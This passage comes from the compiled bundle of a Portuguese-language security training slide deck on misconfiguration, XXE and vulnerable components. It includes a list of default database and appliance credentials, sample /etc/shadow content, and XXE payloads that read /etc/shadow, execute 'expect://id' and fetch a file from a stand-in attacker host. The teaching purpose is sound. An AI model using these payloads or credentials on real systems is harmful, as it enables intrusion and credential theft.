|MSSQL|sa|BLANK|
|MSSQL|sa|sa|
|MSSQL|sa|password|
|MSSQL|sa|Password123|
|MySQL|root|BLANK|
|MySQL|superdba|admin|
|SonarQube|admin|admin|
|SonicWALL|admin|password|

</div>
</div>

<arrow v-click x1="950" y1="360" x2="830" y2="395" color="#F00" width="3" arrowSize="1" style="transition: 500ms" />
<br>
<div v-click>

###### Fonte das credenciais:
###### https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

</div>`,frontmatter:{title:"Usu\xE1rio e senha padr\xE3o"},index:0,start:0,end:43},inline:{raw:`---
src: ./slides/43.security-misconfiguration.md
---
`,content:"",frontmatter:{},index:28,start:147,end:151},filepath:"/home/tux/Work/crescer/dia-2/slides/43.security-misconfiguration.md",notesHTML:"",id:28,no:29},__clicksElements:[],__preloaded:!1}},{path:"30",name:"page-30",component:Ax,meta:{title:"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)",srcSequence:"./slides/44.security-misconfiguration.md",slide:{raw:null,title:"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)",level:1,content:`# Aplica\xE7\xE3o com privil\xE9gios de administrador (root)

Uma aplica\xE7\xE3o sendo executada com permiss\xF5es de root poder\xE1 efetuar qualquer opera\xE7\xE3o. 

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

E se a aplica\xE7\xE3o estiver vulner\xE1vel a leitura arbitr\xE1ria de arquivos ?

<br>

<div>
  <Image src="confidencial-folder.png" style="border-radius:10px;margin:0 auto" width="200" />
</div>

</div>
<div v-click style="transition:500ms">

##### Arquivo de contas: /etc/passwd

\`\`\`bash
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
appsec:x:1000:1000::/home/appsec:/bin/bash
\`\`\`


##### Arquivo de senhas: /etc/shadow (Restrito \xE0 root)

\`\`\`bash
root:*:19143:0:99999:7:::
sys:*:19143:0:99999:7:::
sync:*:19143:0:99999:7:::
games:*:19143:0:99999:7:::
mail:*:19143:0:99999:7:::
proxy:*:19143:0:99999:7:::
www-data:*:19143:0:99999:7:::
appsec:$1$w29RF9x7$/T2ge9uNKATepqNvd/dod.:19284:0:99999:7:::
\`\`\`

</div>
</div>`,frontmatter:{title:"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)",srcSequence:"./slides/44.security-misconfiguration.md"},index:29,start:0,end:47,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/44.security-misconfiguration.md",raw:`# Aplica\xE7\xE3o com privil\xE9gios de administrador (root)

Uma aplica\xE7\xE3o sendo executada com permiss\xF5es de root poder\xE1 efetuar qualquer opera\xE7\xE3o. 

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

E se a aplica\xE7\xE3o estiver vulner\xE1vel a leitura arbitr\xE1ria de arquivos ?

<br>

<div>
  <Image src="confidencial-folder.png" style="border-radius:10px;margin:0 auto" width="200" />
</div>

</div>
<div v-click style="transition:500ms">

##### Arquivo de contas: /etc/passwd

\`\`\`bash
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
appsec:x:1000:1000::/home/appsec:/bin/bash
\`\`\`


##### Arquivo de senhas: /etc/shadow (Restrito \xE0 root)

\`\`\`bash
root:*:19143:0:99999:7:::
sys:*:19143:0:99999:7:::
sync:*:19143:0:99999:7:::
games:*:19143:0:99999:7:::
mail:*:19143:0:99999:7:::
proxy:*:19143:0:99999:7:::
www-data:*:19143:0:99999:7:::
appsec:$1$w29RF9x7$/T2ge9uNKATepqNvd/dod.:19284:0:99999:7:::
\`\`\`

</div>
</div>`,title:"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)",level:1,content:`# Aplica\xE7\xE3o com privil\xE9gios de administrador (root)

Uma aplica\xE7\xE3o sendo executada com permiss\xF5es de root poder\xE1 efetuar qualquer opera\xE7\xE3o. 

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

E se a aplica\xE7\xE3o estiver vulner\xE1vel a leitura arbitr\xE1ria de arquivos ?

<br>

<div>
  <Image src="confidencial-folder.png" style="border-radius:10px;margin:0 auto" width="200" />
</div>

</div>
<div v-click style="transition:500ms">

##### Arquivo de contas: /etc/passwd

\`\`\`bash
root:x:0:0:root:/root:/bin/bash
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
appsec:x:1000:1000::/home/appsec:/bin/bash
\`\`\`


##### Arquivo de senhas: /etc/shadow (Restrito \xE0 root)

\`\`\`bash
root:*:19143:0:99999:7:::
sys:*:19143:0:99999:7:::
sync:*:19143:0:99999:7:::
games:*:19143:0:99999:7:::
mail:*:19143:0:99999:7:::
proxy:*:19143:0:99999:7:::
www-data:*:19143:0:99999:7:::
appsec:$1$w29RF9x7$/T2ge9uNKATepqNvd/dod.:19284:0:99999:7:::
\`\`\`

</div>
</div>`,frontmatter:{title:"Aplica\xE7\xE3o com privil\xE9gios de administrador (root)"},index:0,start:0,end:47},inline:{raw:`---
src: ./slides/44.security-misconfiguration.md
---
`,content:"",frontmatter:{},index:29,start:151,end:155},filepath:"/home/tux/Work/crescer/dia-2/slides/44.security-misconfiguration.md",notesHTML:"",id:29,no:30},__clicksElements:[],__preloaded:!1}},{path:"31",name:"page-31",component:Ix,meta:{title:"XML External Entities (XXE)",srcSequence:"./slides/45.xxe.md",slide:{raw:null,title:"XML External Entities (XXE)",level:1,content:`# XML External Entities (XXE)

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

XML Padr\xE3o

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
</produtos>

\`\`\`

</div>

<div v-click style="transition:500ms">

XML com vari\xE1veis
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE produtos [
  <!ENTITY tipo "Eletr\xF4nicos">
]>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>&tipo;</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>&tipo;</tipo>
  </produto>
</produtos>

\`\`\`

</div>
</div>`,frontmatter:{title:"XML External Entities (XXE)",srcSequence:"./slides/45.xxe.md"},index:30,start:0,end:51,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/45.xxe.md",raw:`# XML External Entities (XXE)

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

XML Padr\xE3o

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
</produtos>

\`\`\`

</div>

<div v-click style="transition:500ms">

XML com vari\xE1veis
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE produtos [
  <!ENTITY tipo "Eletr\xF4nicos">
]>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>&tipo;</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>&tipo;</tipo>
  </produto>
</produtos>

\`\`\`

</div>
</div>`,title:"XML External Entities (XXE)",level:1,content:`# XML External Entities (XXE)

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">

XML Padr\xE3o

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>Eletr\xF4nicos</tipo>
  </produto>
</produtos>

\`\`\`

</div>

<div v-click style="transition:500ms">

XML com vari\xE1veis
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE produtos [
  <!ENTITY tipo "Eletr\xF4nicos">
]>
<produtos>
  <produto>
    <nome>Televis\xE3o</nome>
    <valor>850.50</valor>
    <tipo>&tipo;</tipo>
  </produto>
  <produto>
    <nome>Celular</nome>
    <valor>752</valor>
    <tipo>&tipo;</tipo>
  </produto>
</produtos>

\`\`\`

</div>
</div>`,frontmatter:{title:"XML External Entities (XXE)"},index:0,start:0,end:51},inline:{raw:`---
src: ./slides/45.xxe.md
---
`,content:"",frontmatter:{},index:30,start:155,end:159},filepath:"/home/tux/Work/crescer/dia-2/slides/45.xxe.md",notesHTML:"",id:30,no:31},__clicksElements:[],__preloaded:!1}},{path:"32",name:"page-32",component:Ux,meta:{title:"XXE Injection",srcSequence:"./slides/46.xxe-injection.md",slide:{raw:null,title:"XXE Injection",level:1,content:`# XXE Injection

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">
Leitura de arquivo

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE doc [<!ELEMENT doc ANY >
  <!ENTITY tipo SYSTEM "file:///etc/shadow" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>

<div v-click style="transition:500ms">
Execu\xE7\xE3o de comandos (RCE)

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
   <!ENTITY tipo SYSTEM "expect://id" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>
</div>

<div v-click style="transition:500ms">

Requisi\xE7\xE3o (SSRF)
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
  <!ENTITY tipo SYSTEM "http://www.attacker.com/malware.exe" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>`,frontmatter:{title:"XXE Injection",srcSequence:"./slides/46.xxe-injection.md"},index:31,start:0,end:54,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/46.xxe-injection.md",raw:`# XXE Injection

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">
Leitura de arquivo

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE doc [<!ELEMENT doc ANY >
  <!ENTITY tipo SYSTEM "file:///etc/shadow" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>

<div v-click style="transition:500ms">
Execu\xE7\xE3o de comandos (RCE)

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
   <!ENTITY tipo SYSTEM "expect://id" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>
</div>

<div v-click style="transition:500ms">

Requisi\xE7\xE3o (SSRF)
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
  <!ENTITY tipo SYSTEM "http://www.attacker.com/malware.exe" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>`,title:"XXE Injection",level:1,content:`# XXE Injection

<div grid="~ cols-2 gap-4">
<div v-click style="transition:500ms">
Leitura de arquivo

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE doc [<!ELEMENT doc ANY >
  <!ENTITY tipo SYSTEM "file:///etc/shadow" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>

<div v-click style="transition:500ms">
Execu\xE7\xE3o de comandos (RCE)

\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
   <!ENTITY tipo SYSTEM "expect://id" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>
</div>

<div v-click style="transition:500ms">

Requisi\xE7\xE3o (SSRF)
\`\`\`xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ELEMENT foo ANY >
  <!ENTITY tipo SYSTEM "http://www.attacker.com/malware.exe" >]>
<produto>
  <nome>Celular</nome>
  <valor>752</valor>
  <tipo>&tipo;</tipo>
</produto>

\`\`\`

</div>`,frontmatter:{title:"XXE Injection"},index:0,start:0,end:54},inline:{raw:`---
src: ./slides/46.xxe-injection.md
---
`,content:"",frontmatter:{},index:31,start:159,end:163},filepath:"/home/tux/Work/crescer/dia-2/slides/46.xxe-injection.md",notesHTML:"",id:31,no:32},__clicksElements:[],__preloaded:!1}},{path:"33",name:"page-33",component:Yx,meta:{title:"Componentes desatualizados e vulner\xE1veis",layout:"center",class:"text-center",srcSequence:"./slides/50.components.md",slide:{raw:null,title:"Componentes desatualizados e vulner\xE1veis",level:1,content:"# Componentes desatualizados e vulner\xE1veis",frontmatter:{title:"Componentes desatualizados e vulner\xE1veis",layout:"center",class:"text-center",srcSequence:"./slides/50.components.md"},index:32,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/50.components.md",raw:"# Componentes desatualizados e vulner\xE1veis",title:"Componentes desatualizados e vulner\xE1veis",level:1,content:"# Componentes desatualizados e vulner\xE1veis",frontmatter:{title:"Componentes desatualizados e vulner\xE1veis"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/50.components.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:32,start:163,end:169},filepath:"/home/tux/Work/crescer/dia-2/slides/50.components.md",notesHTML:"",id:32,no:33},__clicksElements:[],__preloaded:!1}},{path:"34",name:"page-34",component:t3,meta:{title:"O que s\xE3o componentes de software?",srcSequence:"./slides/51.components.md",slide:{raw:null,title:"O que s\xE3o componentes de software?",level:1,content:`# O que s\xE3o componentes de software?

#### S\xE3o peda\xE7os pr\xE9-desenvolvidos de c\xF3digo utilizados na composi\xE7\xE3o de um software. S\xE3o tamb\xE9m chamados de biblioteca, framework, depend\xEAncia, pacote etc...

<br>
<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="react-logo.png" width="100" />
  </div>
  <div>
    <Image src="angular-logo.png" width="100" />
  </div>
  <div>
    <Image src="vue-logo.png" width="100" />
  </div>
  <div>
    <Image src="jquery-logo.png" width="100" />
  </div>
</div>

<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="spring-boot-logo.png" width="100" />
  </div>
  <div>
    <Image src="dotnet-logo.png" width="100" />
  </div>
  <div>
    <Image src="laravel-logo.png" width="100" />
  </div>
  <div>
    <Image src="django-logo.png" width="100" />
  </div>
</div>`,frontmatter:{title:"O que s\xE3o componentes de software?",srcSequence:"./slides/51.components.md"},index:33,start:0,end:38,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/51.components.md",raw:`# O que s\xE3o componentes de software?

#### S\xE3o peda\xE7os pr\xE9-desenvolvidos de c\xF3digo utilizados na composi\xE7\xE3o de um software. S\xE3o tamb\xE9m chamados de biblioteca, framework, depend\xEAncia, pacote etc...

<br>
<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="react-logo.png" width="100" />
  </div>
  <div>
    <Image src="angular-logo.png" width="100" />
  </div>
  <div>
    <Image src="vue-logo.png" width="100" />
  </div>
  <div>
    <Image src="jquery-logo.png" width="100" />
  </div>
</div>

<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="spring-boot-logo.png" width="100" />
  </div>
  <div>
    <Image src="dotnet-logo.png" width="100" />
  </div>
  <div>
    <Image src="laravel-logo.png" width="100" />
  </div>
  <div>
    <Image src="django-logo.png" width="100" />
  </div>
</div>`,title:"O que s\xE3o componentes de software?",level:1,content:`# O que s\xE3o componentes de software?

#### S\xE3o peda\xE7os pr\xE9-desenvolvidos de c\xF3digo utilizados na composi\xE7\xE3o de um software. S\xE3o tamb\xE9m chamados de biblioteca, framework, depend\xEAncia, pacote etc...

<br>
<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="react-logo.png" width="100" />
  </div>
  <div>
    <Image src="angular-logo.png" width="100" />
  </div>
  <div>
    <Image src="vue-logo.png" width="100" />
  </div>
  <div>
    <Image src="jquery-logo.png" width="100" />
  </div>
</div>

<br>

<div v-click style="transition: 500ms" grid="~ cols-4 gap-4">
  <div>
    <Image src="spring-boot-logo.png" width="100" />
  </div>
  <div>
    <Image src="dotnet-logo.png" width="100" />
  </div>
  <div>
    <Image src="laravel-logo.png" width="100" />
  </div>
  <div>
    <Image src="django-logo.png" width="100" />
  </div>
</div>`,frontmatter:{title:"O que s\xE3o componentes de software?"},index:0,start:0,end:38},inline:{raw:`---
src: ./slides/51.components.md
---
`,content:"",frontmatter:{},index:33,start:169,end:173},filepath:"/home/tux/Work/crescer/dia-2/slides/51.components.md",notesHTML:"",id:33,no:34},__clicksElements:[],__preloaded:!1}},{path:"35",name:"page-35",component:u3,meta:{title:"Exemplos de depend\xEAncias",srcSequence:"./slides/52.components.md",slide:{raw:null,title:"Exemplos de depend\xEAncias",level:1,content:`# Exemplos de depend\xEAncias

<div grid="~ cols-2 gap-4">
<div>
<br>
<span style="color: #009900">package.json</span>
\`\`\`json {all|5-9}
{
  "version": "1.0.0",
  "name": "api-teste",
  "private": true,
  "dependencies": {
    "body-parser": "^1.20.0",
    "express": "^4.18.1",
    "nodemon": "^2.0.20"
  }
}
\`\`\`
</div>
<div>
<br>
<span style="color: #009900">pom.xml</span>
\`\`\`xml {all|14-18}
<dependencies>
  <dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-data-jpa</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-validation</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-web</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-security</artifactId>
		<version>2.6.3</version>
	</dependency>
</dependencies>
\`\`\`
</div>
</div>`,frontmatter:{title:"Exemplos de depend\xEAncias",srcSequence:"./slides/52.components.md"},index:34,start:0,end:45,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/52.components.md",raw:`# Exemplos de depend\xEAncias

<div grid="~ cols-2 gap-4">
<div>
<br>
<span style="color: #009900">package.json</span>
\`\`\`json {all|5-9}
{
  "version": "1.0.0",
  "name": "api-teste",
  "private": true,
  "dependencies": {
    "body-parser": "^1.20.0",
    "express": "^4.18.1",
    "nodemon": "^2.0.20"
  }
}
\`\`\`
</div>
<div>
<br>
<span style="color: #009900">pom.xml</span>
\`\`\`xml {all|14-18}
<dependencies>
  <dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-data-jpa</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-validation</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-web</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-security</artifactId>
		<version>2.6.3</version>
	</dependency>
</dependencies>
\`\`\`
</div>
</div>`,title:"Exemplos de depend\xEAncias",level:1,content:`# Exemplos de depend\xEAncias

<div grid="~ cols-2 gap-4">
<div>
<br>
<span style="color: #009900">package.json</span>
\`\`\`json {all|5-9}
{
  "version": "1.0.0",
  "name": "api-teste",
  "private": true,
  "dependencies": {
    "body-parser": "^1.20.0",
    "express": "^4.18.1",
    "nodemon": "^2.0.20"
  }
}
\`\`\`
</div>
<div>
<br>
<span style="color: #009900">pom.xml</span>
\`\`\`xml {all|14-18}
<dependencies>
  <dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-data-jpa</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-validation</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-web</artifactId>
	</dependency>
	<dependency>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-security</artifactId>
		<version>2.6.3</version>
	</dependency>
</dependencies>
\`\`\`
</div>
</div>`,frontmatter:{title:"Exemplos de depend\xEAncias"},index:0,start:0,end:45},inline:{raw:`---
src: ./slides/52.components.md
---
`,content:"",frontmatter:{},index:34,start:173,end:177},filepath:"/home/tux/Work/crescer/dia-2/slides/52.components.md",notesHTML:"",id:34,no:35},__clicksElements:[],__preloaded:!1}},{path:"36",name:"page-36",component:I3,meta:{title:"Gerenciadores de pacotes",clicks:5,srcSequence:"./slides/53.components.md",slide:{raw:null,title:"Gerenciadores de pacotes",level:1,content:`# Gerenciadores de pacotes


<div grid="~ cols-3 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Nuget (.Net)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Npm (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Yarn (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Pip (Python)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Maven (Java)</h3>
</p>

<div>
  <div v-click="1" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="nuget-logo.png" width="150" />
  </div>

  <div v-click="2" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="npm-logo.png" width="100" />
  </div>

  <div  v-click="3" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="yarn-logo.png" width="60" />
  </div>
</div>
<div>
  <div  v-click="4" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="pip-logo.webp" width="70" />
  </div>

  <div  v-click="5" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="maven-logo.png" width="200" />
  </div>
</div>
</div>`,frontmatter:{title:"Gerenciadores de pacotes",clicks:5,srcSequence:"./slides/53.components.md"},index:35,start:0,end:35,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/53.components.md",raw:`# Gerenciadores de pacotes


<div grid="~ cols-3 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Nuget (.Net)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Npm (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Yarn (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Pip (Python)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Maven (Java)</h3>
</p>

<div>
  <div v-click="1" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="nuget-logo.png" width="150" />
  </div>

  <div v-click="2" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="npm-logo.png" width="100" />
  </div>

  <div  v-click="3" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="yarn-logo.png" width="60" />
  </div>
</div>
<div>
  <div  v-click="4" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="pip-logo.webp" width="70" />
  </div>

  <div  v-click="5" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="maven-logo.png" width="200" />
  </div>
</div>
</div>`,title:"Gerenciadores de pacotes",level:1,content:`# Gerenciadores de pacotes


<div grid="~ cols-3 gap-4">
<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Nuget (.Net)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Npm (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Yarn (NodeJS)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Pip (Python)</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Maven (Java)</h3>
</p>

<div>
  <div v-click="1" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="nuget-logo.png" width="150" />
  </div>

  <div v-click="2" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="npm-logo.png" width="100" />
  </div>

  <div  v-click="3" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="yarn-logo.png" width="60" />
  </div>
</div>
<div>
  <div  v-click="4" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="pip-logo.webp" width="70" />
  </div>

  <div  v-click="5" style="text-align: center">
    <Image style="margin: 0 auto;margin-top: 20px" src="maven-logo.png" width="200" />
  </div>
</div>
</div>`,frontmatter:{title:"Gerenciadores de pacotes"},index:0,start:0,end:35},inline:{raw:`---
src: ./slides/53.components.md
clicks: 5
---
`,content:"",frontmatter:{clicks:5},index:35,start:177,end:182},filepath:"/home/tux/Work/crescer/dia-2/slides/53.components.md",notesHTML:"",id:35,no:36},__clicksElements:[],__preloaded:!1}},{path:"37",name:"page-37",component:X3,meta:{title:"Problemas em componentes",clicks:4,srcSequence:"./slides/54.components.md",slide:{raw:null,title:"Problemas em componentes",level:1,content:`# Problemas em componentes

<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Vulner\xE1veis</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Desatualizados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Descontinuados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Sabotados</h3>
</p>

<br>

<div grid="~ cols-3 gap-4">
  <div>
    <Image v-click="1" style="border-radius: 10px; transition: 300ms" src="log4j.png" width="300" />
    <Image v-click="2" style="border-radius: 10px; transition: 300ms; margin-top: 20px" src="npm-logo.png" width="300" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-2.png" width="315" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-1.png" width="300" />
  </div>
</div>`,frontmatter:{title:"Problemas em componentes",clicks:4,srcSequence:"./slides/54.components.md"},index:36,start:0,end:23,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/54.components.md",raw:`# Problemas em componentes

<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Vulner\xE1veis</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Desatualizados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Descontinuados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Sabotados</h3>
</p>

<br>

<div grid="~ cols-3 gap-4">
  <div>
    <Image v-click="1" style="border-radius: 10px; transition: 300ms" src="log4j.png" width="300" />
    <Image v-click="2" style="border-radius: 10px; transition: 300ms; margin-top: 20px" src="npm-logo.png" width="300" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-2.png" width="315" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-1.png" width="300" />
  </div>
</div>`,title:"Problemas em componentes",level:1,content:`# Problemas em componentes

<p>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Vulner\xE1veis</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Desatualizados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Descontinuados</h3>
  <h3 style="margin-left: 40px; transition: 500ms" v-click>- Sabotados</h3>
</p>

<br>

<div grid="~ cols-3 gap-4">
  <div>
    <Image v-click="1" style="border-radius: 10px; transition: 300ms" src="log4j.png" width="300" />
    <Image v-click="2" style="border-radius: 10px; transition: 300ms; margin-top: 20px" src="npm-logo.png" width="300" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-2.png" width="315" />
  </div>
  <div>
    <Image v-click="4" style="border-radius: 10px; transition: 300ms" src="sabotaged-packages-1.png" width="300" />
  </div>
</div>`,frontmatter:{title:"Problemas em componentes"},index:0,start:0,end:23},inline:{raw:`---
src: ./slides/54.components.md
clicks: 4
---
`,content:"",frontmatter:{clicks:4},index:36,start:182,end:187},filepath:"/home/tux/Work/crescer/dia-2/slides/54.components.md",notesHTML:"",id:36,no:37},__clicksElements:[],__preloaded:!1}},{path:"38",name:"page-38",component:aw,meta:{title:"Componentes comprometidos",srcSequence:"./slides/55.components.md",slide:{raw:null,title:"Componentes comprometidos",level:1,content:`# Componentes comprometidos

